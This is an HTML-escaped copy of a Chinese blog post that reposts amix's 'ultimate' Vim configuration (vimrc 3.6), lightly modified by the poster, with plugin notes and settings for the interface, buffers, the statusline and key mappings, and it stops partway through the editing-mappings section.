(23, 23, '&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;font-size:16px;color:#cc0000&quot;&gt;该配置是楼主从网上找的，源地址忘记了，所以未注明转载地址，但是作者的title等说明信息一概保留，楼主修改了部分信息，包括字体，文件编码，colorscheme等，仅作备份&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; Maintainer: amix the lucky stiff \r\n&quot;             http://amix.dk - amix@amix.dk \r\n&quot; \r\n&quot; Version: 3.6 - 25/08/10 14:40:30 \r\n&quot; \r\n&quot; Blog_post:  \r\n&quot;       http://amix.dk/blog/post/19486#The-ultimate-vim-configuration-vimrc \r\n&quot; Syntax_highlighted: \r\n&quot;       http://amix.dk/vim/vimrc.html \r\n&quot; Raw_version:  \r\n&quot;       http://amix.dk/vim/vimrc.txt \r\n&quot; \r\n&quot; How_to_Install_on_Unix: \r\n&quot;    $ mkdir ~/.vim_runtime \r\n&quot;    $ svn co svn://orangoo.com/vim ~/.vim_runtime \r\n&quot;    $ cat ~/.vim_runtime/install.sh \r\n&quot;    $ sh ~/.vim_runtime/install.sh &amp;lt;system&amp;gt; \r\n&quot;      &amp;lt;sytem&amp;gt; can be `mac`, `linux` or `windows` \r\n&quot; \r\n&quot; How_to_Upgrade: \r\n&quot;    $ svn update ~/.vim_runtime \r\n&quot; \r\n&quot; Sections: \r\n&quot;    -&amp;gt; General \r\n&quot;    -&amp;gt; VIM user interface \r\n&quot;    -&amp;gt; Colors and Fonts \r\n&quot;    -&amp;gt; Files and backups \r\n&quot;    -&amp;gt; Text, tab and indent related \r\n&quot;    -&amp;gt; Visual mode related \r\n&quot;    -&amp;gt; Command mode related \r\n&quot;    -&amp;gt; Moving around, tabs and buffers \r\n&quot;    -&amp;gt; Statusline \r\n&quot;    -&amp;gt; Parenthesis/bracket expanding \r\n&quot;    -&amp;gt; General Abbrevs \r\n&quot;    -&amp;gt; Editing mappings \r\n&quot; \r\n&quot;    -&amp;gt; Cope \r\n&quot;    -&amp;gt; Minibuffer plugin \r\n&quot;    -&amp;gt; Omni complete functions \r\n&quot;    -&amp;gt; Python section \r\n&quot;    -&amp;gt; JavaScript section \r\n&quot; \r\n&quot; \r\n&quot; Plugins_Included: \r\n&quot;     &amp;gt; minibufexpl.vim - http://www.vim.org/scripts/script.php?script_id=159 \r\n&quot;       Makes it easy to get an overview of buffers: \r\n&quot;           info -&amp;gt; :e ~/.vim_runtime/plugin/minibufexpl.vim \r\n&quot; \r\n&quot;     &amp;gt; bufexplorer - http://www.vim.org/scripts/script.php?script_id=42 \r\n&quot;       Makes it easy to switch between buffers: \r\n&quot;           info -&amp;gt; :help bufExplorer \r\n&quot; \r\n&quot;     &amp;gt; yankring.vim - http://www.vim.org/scripts/script.php?script_id=1234 \r\n&quot;       Emacs&#039;s killring, useful when using the clipboard: \r\n&quot;           info -&amp;gt; :help yankring \r\n&quot; \r\n&quot;     &amp;gt; surround.vim - http://www.vim.org/scripts/script.php?script_id=1697 \r\n&quot;       Makes it easy to work with surrounding text: \r\n&quot;           info -&amp;gt; :help surround \r\n&quot; \r\n&quot;     &amp;gt; snipMate.vim - http://www.vim.org/scripts/script.php?script_id=2540 \r\n&quot;       Snippets for many languages (similar to TextMate&#039;s): \r\n&quot;           info -&amp;gt; :help snipMate \r\n&quot; \r\n&quot;     &amp;gt; mru.vim - http://www.vim.org/scripts/script.php?script_id=521 \r\n&quot;       Plugin to manage Most Recently Used (MRU) files: \r\n&quot;           info -&amp;gt; :e ~/.vim_runtime/plugin/mru.vim \r\n&quot; \r\n&quot;     &amp;gt; Command-T - http://www.vim.org/scripts/script.php?script_id=3025 \r\n&quot;       Command-T plug-in provides an extremely fast, intuitive mechanism for opening filesa: \r\n&quot;           info -&amp;gt; :help CommandT \r\n&quot;           screencast and web-help -&amp;gt; http://amix.dk/blog/post/19501 \r\n&quot; \r\n&quot; \r\n&quot;  Revisions: \r\n&quot;     &amp;gt; 3.6: Added lots of stuff (colors, Command-T, Vim 7.3 persistent undo etc.) \r\n&quot;     &amp;gt; 3.5: Paste mode is now shown in status line  if you are in paste mode \r\n&quot;     &amp;gt; 3.4: Added mru.vim \r\n&quot;     &amp;gt; 3.3: Added syntax highlighting for Mako mako.vim  \r\n&quot;     &amp;gt; 3.2: Turned on python_highlight_all for better syntax \r\n&quot;            highlighting for Python \r\n&quot;     &amp;gt; 3.1: Added revisions ;) and bufexplorer.vim \r\n&quot; \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; General \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; Sets how many lines of history VIM has to remember \r\nset history=700 \r\n             \r\n&quot; Enable filetype plugin \r\nfiletype plugin on \r\nfiletype indent on \r\n             \r\n&quot; Set to auto read when a file is changed from the outside \r\nset autoread \r\n             \r\n&quot; With a map leader it&#039;s possible to do extra key combinations \r\n&quot; like &amp;lt;leader&amp;gt;w saves the current file \r\nlet mapleader = &quot;,&quot; \r\nlet g:mapleader = &quot;,&quot; \r\n             \r\n&quot; Fast saving \r\nnmap &amp;lt;leader&amp;gt;w :w!&amp;lt;cr&amp;gt; \r\n             \r\n&quot; Fast editing of the .vimrc \r\nmap &amp;lt;leader&amp;gt;e :e! ~/.vim_runtime/vimrc&amp;lt;cr&amp;gt; \r\n             \r\n&quot; When vimrc is edited, reload it \r\nautocmd! bufwritepost vimrc source ~/.vim_runtime/vimrc \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; VIM user interface \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; Set 7 lines to the curors - when moving vertical.. \r\nset so=7 \r\n             \r\nset wildmenu &quot;Turn on WiLd menu \r\n             \r\nset ruler &quot;Always show current position \r\n             \r\nset cmdheight=2 &quot;The commandbar height \r\n             \r\nset hid &quot;Change buffer - without saving \r\n             \r\n&quot; Set backspace config \r\nset backspace=eol,start,indent \r\nset whichwrap+=&amp;lt;,&amp;gt;,h,l \r\n             \r\nset ignorecase &quot;搜索时忽略大小写 \r\nset smartcase \r\n             \r\nset hlsearch &quot;开启搜索高亮 \r\n             \r\nset incsearch &quot;输入搜索字符串的同时进行搜索 \r\nset nolazyredraw &quot;Don&#039;t redraw while executing macros  \r\n             \r\nset magic &quot;Set magic on, for regular expressions \r\n             \r\nset showmatch &quot;Show matching bracets when text indicator is over them \r\nset mat=2 &quot;How many tenths of a second to blink \r\n             \r\n&quot; No sound on errors \r\nset noerrorbells \r\nset novisualbell \r\nset t_vb= \r\nset tm=500 \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; Colors and Fonts \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\nsyntax enable &quot;开启代码高亮 \r\n             \r\nfunc! MySys() \r\n  return &quot;mac&quot; \r\nendfunc \r\n             \r\n&quot; Set font according to system \r\nif MySys() == &quot;mac&quot; \r\n  set gfn=SimSun:h16 \r\n  set shell=/bin/bash \r\nelseif MySys() == &quot;windows&quot; \r\n  set gfn=Bitstream Vera Sans Mono:h10 \r\nelseif MySys() == &quot;linux&quot; \r\n  set gfn=Monospace 10 \r\n  set shell=/bin/bash \r\nendif \r\n             \r\nif has(&quot;gui_running&quot;) \r\n  set guioptions-=T \r\n  set t_Co=256 \r\n  colorscheme laphp \r\nendif \r\n             \r\nset number \r\n             \r\nset encoding=utf-8 \r\nset fileencodings=utf-8,chinese,latin-1 \r\n             \r\nsource $VIMRUNTIME/delmenu.vim \r\nsource $VIMRUNTIME/menu.vim \r\n             \r\ntry \r\n    lang en_US \r\ncatch \r\nendtry \r\n             \r\nset ffs=unix,dos,mac &quot;Default file types \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; Files, backups and undo \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; Turn backup off, since most stuff is in SVN, git anyway... \r\nset nobackup \r\nset nowb \r\nset noswapfile \r\n             \r\n&quot;Persistent undo \r\ntry \r\n    if MySys() == &quot;windows&quot; \r\n      set undodir=C:WindowsTemp \r\n    else \r\n      set undodir=~/.vim_runtime/undodir \r\n    endif \r\n             \r\n    set undofile \r\ncatch \r\nendtry \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; Text, tab and indent related \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\nset expandtab \r\nset shiftwidth=4 \r\nset tabstop=4 \r\nset smarttab \r\n             \r\nset lbr \r\nset tw=500 \r\n             \r\nset ai &quot;Auto indent \r\nset si &quot;Smart indet \r\nset wrap &quot;Wrap lines \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; Visual mode related \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; Really useful! \r\n&quot;  In visual mode when you press * or # to search for the current selection \r\nvnoremap &amp;lt;silent&amp;gt; * :call VisualSearch(&#039;f&#039;)&amp;lt;CR&amp;gt; \r\nvnoremap &amp;lt;silent&amp;gt; # :call VisualSearch(&#039;b&#039;)&amp;lt;CR&amp;gt; \r\n             \r\n&quot; When you press gv you vimgrep after the selected text \r\nvnoremap &amp;lt;silent&amp;gt; gv :call VisualSearch(&#039;gv&#039;)&amp;lt;CR&amp;gt; \r\nmap &amp;lt;leader&amp;gt;g :vimgrep // **/*.&amp;lt;left&amp;gt;&amp;lt;left&amp;gt;&amp;lt;left&amp;gt;&amp;lt;left&amp;gt;&amp;lt;left&amp;gt;&amp;lt;left&amp;gt;&amp;lt;left&amp;gt; \r\n             \r\n             \r\nfunction! CmdLine(str) \r\n    exe &quot;menu Foo.Bar :&quot; . a:str \r\n    emenu Foo.Bar \r\n    unmenu Foo \r\nendfunction \r\n             \r\n&quot; From an idea by Michael Naumann \r\nfunction! VisualSearch(direction) range \r\n    let l:saved_reg = @&quot; \r\n    execute &quot;normal! vgvy&quot; \r\n             \r\n    let l:pattern = escape(@&quot;, &#039;\\/.*$^~[]&#039;) \r\n    let l:pattern = substitute(l:pattern, &quot;\n{1}quot;, &quot;&quot;, &quot;&quot;) \r\n             \r\n    if a:direction == &#039;b&#039; \r\n        execute &quot;normal ?&quot; . l:pattern . &quot;^M&quot; \r\n    elseif a:direction == &#039;gv&#039; \r\n        call CmdLine(&quot;vimgrep &quot; . &#039;/&#039;. l:pattern . &#039;/&#039; . &#039; **/*.&#039;) \r\n    elseif a:direction == &#039;f&#039; \r\n        execute &quot;normal /&quot; . l:pattern . &quot;^M&quot; \r\n    endif \r\n             \r\n    let @/ = l:pattern \r\n    let @&quot; = l:saved_reg \r\nendfunction \r\n             \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; Command mode related \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; Smart mappings on the command line \r\ncno $h e ~/ \r\ncno $d e ~/Desktop/ \r\ncno $j e ./ \r\ncno $c e &amp;lt;C-&amp;gt;eCurrentFileDir(&quot;e&quot;)&amp;lt;cr&amp;gt; \r\n             \r\n&quot; $q is super useful when browsing on the command line \r\ncno $q &amp;lt;C-&amp;gt;eDeleteTillSlash()&amp;lt;cr&amp;gt; \r\n             \r\n&quot; Bash like keys for the command line \r\ncnoremap &amp;lt;C-A&amp;gt;      &amp;lt;Home&amp;gt; \r\ncnoremap &amp;lt;C-E&amp;gt;      &amp;lt;End&amp;gt; \r\ncnoremap &amp;lt;C-K&amp;gt;      &amp;lt;C-U&amp;gt; \r\n             \r\ncnoremap &amp;lt;C-P&amp;gt; &amp;lt;Up&amp;gt; \r\ncnoremap &amp;lt;C-N&amp;gt; &amp;lt;Down&amp;gt; \r\n             \r\n&quot; Useful on some European keyboards \r\nmap &frac12; $ \r\nimap &frac12; $ \r\nvmap &frac12; $ \r\ncmap &frac12; $ \r\n             \r\n             \r\nfunc! Cwd() \r\n  let cwd = getcwd() \r\n  return &quot;e &quot; . cwd  \r\nendfunc \r\n             \r\nfunc! DeleteTillSlash() \r\n  let g:cmd = getcmdline() \r\n  if MySys() == &quot;linux&quot; || MySys() == &quot;mac&quot; \r\n    let g:cmd_edited = substitute(g:cmd, &quot;\\(.*[/]\\).*&quot;, &quot;\\1&quot;, &quot;&quot;) \r\n  else \r\n    let g:cmd_edited = substitute(g:cmd, &quot;\\(.*[\\\\]\\).*&quot;, &quot;\\1&quot;, &quot;&quot;) \r\n  endif \r\n  if g:cmd == g:cmd_edited \r\n    if MySys() == &quot;linux&quot; || MySys() == &quot;mac&quot; \r\n      let g:cmd_edited = substitute(g:cmd, &quot;\\(.*[/]\\).*/&quot;, &quot;\\1&quot;, &quot;&quot;) \r\n    else \r\n      let g:cmd_edited = substitute(g:cmd, &quot;\\(.*[\\\\]\\).*[\\\\]&quot;, &quot;\\1&quot;, &quot;&quot;) \r\n    endif \r\n  endif \r\n  return g:cmd_edited \r\nendfunc \r\n             \r\nfunc! CurrentFileDir(cmd) \r\n  return a:cmd . &quot; &quot; . expand(&quot;%:p:h&quot;) . &quot;/&quot; \r\nendfunc \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; Moving around, tabs and buffers \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; Map space to / (search) and c-space to ? (backgwards search) \r\nmap &amp;lt;space&amp;gt; / \r\nmap &amp;lt;c-space&amp;gt; ? \r\nmap &amp;lt;silent&amp;gt; &amp;lt;leader&amp;gt;&amp;lt;cr&amp;gt; :noh&amp;lt;cr&amp;gt; \r\n             \r\n&quot; Smart way to move btw. windows \r\nmap &amp;lt;C-j&amp;gt; &amp;lt;C-W&amp;gt;j \r\nmap &amp;lt;C-k&amp;gt; &amp;lt;C-W&amp;gt;k \r\nmap &amp;lt;C-h&amp;gt; &amp;lt;C-W&amp;gt;h \r\nmap &amp;lt;C-l&amp;gt; &amp;lt;C-W&amp;gt;l \r\n             \r\n&quot; Close the current buffer \r\nmap &amp;lt;leader&amp;gt;bd :Bclose&amp;lt;cr&amp;gt; \r\n             \r\n&quot; Close all the buffers \r\nmap &amp;lt;leader&amp;gt;ba :1,300 bd!&amp;lt;cr&amp;gt; \r\n             \r\n&quot; Use the arrows to something usefull \r\nmap &amp;lt;right&amp;gt; :bn&amp;lt;cr&amp;gt; \r\nmap &amp;lt;left&amp;gt; :bp&amp;lt;cr&amp;gt; \r\n             \r\n&quot; Tab configuration \r\nmap &amp;lt;leader&amp;gt;tn :tabnew&amp;lt;cr&amp;gt; \r\nmap &amp;lt;leader&amp;gt;te :tabedit \r\nmap &amp;lt;leader&amp;gt;tc :tabclose&amp;lt;cr&amp;gt; \r\nmap &amp;lt;leader&amp;gt;tm :tabmove \r\n             \r\n&quot; When pressing &amp;lt;leader&amp;gt;cd switch to the directory of the open buffer \r\nmap &amp;lt;leader&amp;gt;cd :cd %:p:h&amp;lt;cr&amp;gt; \r\n             \r\n             \r\ncommand! Bclose call &amp;lt;SID&amp;gt;BufcloseCloseIt() \r\nfunction! &amp;lt;SID&amp;gt;BufcloseCloseIt() \r\n   let l:currentBufNum = bufnr(&quot;%&quot;) \r\n   let l:alternateBufNum = bufnr(&quot;#&quot;) \r\n             \r\n   if buflisted(l:alternateBufNum) \r\n     buffer # \r\n   else \r\n     bnext \r\n   endif \r\n             \r\n   if bufnr(&quot;%&quot;) == l:currentBufNum \r\n     new \r\n   endif \r\n             \r\n   if buflisted(l:currentBufNum) \r\n     execute(&quot;bdelete! &quot;.l:currentBufNum) \r\n   endif \r\nendfunction \r\n             \r\n&quot; Specify the behavior when switching between buffers  \r\ntry \r\n  set switchbuf=usetab \r\n  set stal=2 \r\ncatch \r\nendtry \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; Statusline \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; Always hide the statusline \r\nset laststatus=2 \r\n             \r\n&quot; Format the statusline \r\nset statusline= %{HasPaste()}%F%m%r%h %w  CWD: %r%{CurDir()}%h   Line: %l/%L:%c \r\n             \r\n             \r\nfunction! CurDir() \r\n    let curdir = substitute(getcwd(), &#039;/Users/amir/&#039;, &quot;~/&quot;, &quot;g&quot;) \r\n    return curdir \r\nendfunction \r\n             \r\nfunction! HasPaste() \r\n    if &amp;amp;paste \r\n        return &#039;PASTE MODE  &#039; \r\n    else \r\n        return &#039;&#039; \r\n    endif \r\nendfunction \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; Parenthesis/bracket expanding \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\nvnoremap $1 &amp;lt;esc&amp;gt;`&amp;gt;a)&amp;lt;esc&amp;gt;`&amp;lt;i(&amp;lt;esc&amp;gt; \r\nvnoremap $2 &amp;lt;esc&amp;gt;`&amp;gt;a]&amp;lt;esc&amp;gt;`&amp;lt;i[&amp;lt;esc&amp;gt; \r\nvnoremap $3 &amp;lt;esc&amp;gt;`&amp;gt;a}&amp;lt;esc&amp;gt;`&amp;lt;i{&amp;lt;esc&amp;gt; \r\nvnoremap $ &amp;lt;esc&amp;gt;`&amp;gt;a&quot;&amp;lt;esc&amp;gt;`&amp;lt;i&quot;&amp;lt;esc&amp;gt; \r\nvnoremap $q &amp;lt;esc&amp;gt;`&amp;gt;a&#039;&amp;lt;esc&amp;gt;`&amp;lt;i&#039;&amp;lt;esc&amp;gt; \r\nvnoremap $e &amp;lt;esc&amp;gt;`&amp;gt;a&quot;&amp;lt;esc&amp;gt;`&amp;lt;i&quot;&amp;lt;esc&amp;gt; \r\n             \r\n&quot; Map auto complete of (, &quot;, &#039;, [ \r\ninoremap $1 ()&amp;lt;esc&amp;gt;i \r\ninoremap $2 []&amp;lt;esc&amp;gt;i \r\ninoremap $3 {}&amp;lt;esc&amp;gt;i \r\ninoremap $4 {&amp;lt;esc&amp;gt;o}&amp;lt;esc&amp;gt;O \r\ninoremap $q &#039;&#039;&amp;lt;esc&amp;gt;i \r\ninoremap $e &quot;&quot;&amp;lt;esc&amp;gt;i \r\ninoremap $t &amp;lt;&amp;gt;&amp;lt;esc&amp;gt;i \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; General Abbrevs \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\niab xdate &amp;lt;c-r&amp;gt;=strftime(&quot;%d/%m/%y %H:%M:%S&quot;)&amp;lt;cr&amp;gt; \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; Editing mappings \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot;Remap VIM 0 \r\nmap 0 ^ \r\n             